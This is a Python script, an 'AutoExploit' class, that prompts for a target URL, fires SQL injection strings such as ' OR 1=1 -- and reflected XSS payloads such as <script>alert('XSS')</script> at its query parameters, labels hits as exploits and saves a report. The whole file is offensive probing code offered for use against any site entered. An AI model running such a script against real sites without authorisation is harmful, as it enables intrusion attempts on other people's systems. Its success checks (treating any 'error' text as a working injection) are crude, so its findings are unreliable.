import requests
from time import sleep
from urllib.parse import quote

class AutoExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.vulnerabilities = []
        self.payloads = []
        self.exploit_results = []

    def scan_for_vulnerabilities(self):
        print("[*] Scanning target for vulnerabilities...")
        self.scan_sql_injection()
        self.scan_xss()

    def scan_sql_injection(self):
        test_payloads = ["' OR 1=1 --", "' OR 'a'='a", '" OR "" = "']
        for payload in test_payloads:
            url = self.target_url + "?id=" + quote(payload)
            print(f"[*] Testing SQLi with payload: {payload}")
            try:
                response = requests.get(url, timeout=8)
            except requests.RequestException as e:
                print(f"[!] Request error: {e}")
                continue
            if "error" in response.text.lower() or response.status_code == 500:
                self.vulnerabilities.append({"type": "SQL Injection", "payload": payload, "url": url})
                print(f"[+] SQL Injection vulnerability found with payload: {payload}")

    def scan_xss(self):
        test_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)' />"]
        for payload in test_payloads:
            url = self.target_url + "?q=" + quote(payload)
            print(f"[*] Testing XSS with payload: {payload}")
            try:
                response = requests.get(url, timeout=8)
            except requests.RequestException as e:
                print(f"[!] Request error: {e}")
                continue
            if payload in response.text:
                self.vulnerabilities.append({"type": "XSS", "payload": payload, "url": url})
                print(f"[+] XSS vulnerability found with payload: {payload}")

    def generate_payloads(self):
        print("[*] Preparing proof-of-concept payloads...")
        # Use the discovered payloads/urls as PoCs for validation
        for vulnerability in self.vulnerabilities:
            self.payloads.append({
                "type": vulnerability["type"],
                "payload": vulnerability["payload"],
                "vulnerability": vulnerability,
            })

    def test_exploits(self):
        print("[*] Testing exploits on the target...")
        for payload in self.payloads:
            self.execute_payload(payload)

    def execute_payload(self, payload):
        print(f"[*] Executing payload: {payload['payload']}")
        try:
            response = requests.get(payload["vulnerability"]["url"], timeout=8)
        except requests.RequestException as e:
            self.exploit_results.append(f"[!] Request error executing payload: {e}")
            print(f"[!] Request error executing payload: {e}")
            return

        if payload["type"] == "SQL Injection":
            if response.status_code == 200 and ("error" in response.text.lower() or 'sql' in response.text.lower()):
                self.exploit_results.append(f"[+] SQL Injection exploit likely successful: {payload['payload']}")
                print(f"[+] SQL Injection exploit likely successful: {payload['payload']}")
            else:
                self.exploit_results.append(f"[-] SQL Injection exploit inconclusive: {payload['payload']}")
                print(f"[-] SQL Injection exploit inconclusive: {payload['payload']}")
        elif payload["type"] == "XSS":
            if payload["payload"] in response.text:
                self.exploit_results.append(f"[+] XSS payload reflected: {payload['payload']}")
                print(f"[+] XSS payload reflected: {payload['payload']}")
            else:
                self.exploit_results.append(f"[-] XSS payload not reflected: {payload['payload']}")
                print(f"[-] XSS payload not reflected: {payload['payload']}")

    def generate_report(self):
        report = "\n[*] Exploit Test Results\n"
        for result in self.exploit_results:
            report += result + "\n"
        with open("exploit_report.txt", "w") as f:
            f.write(report)
        print("[*] Exploit report saved as 'exploit_report.txt'.")

# Usage
if __name__ == '__main__':
    target = input("Enter the target URL (e.g., http://example.com/page): ")
    auto_exploit = AutoExploit(target)
    auto_exploit.scan_for_vulnerabilities()
    auto_exploit.generate_payloads()
    auto_exploit.test_exploits()
    auto_exploit.generate_report()
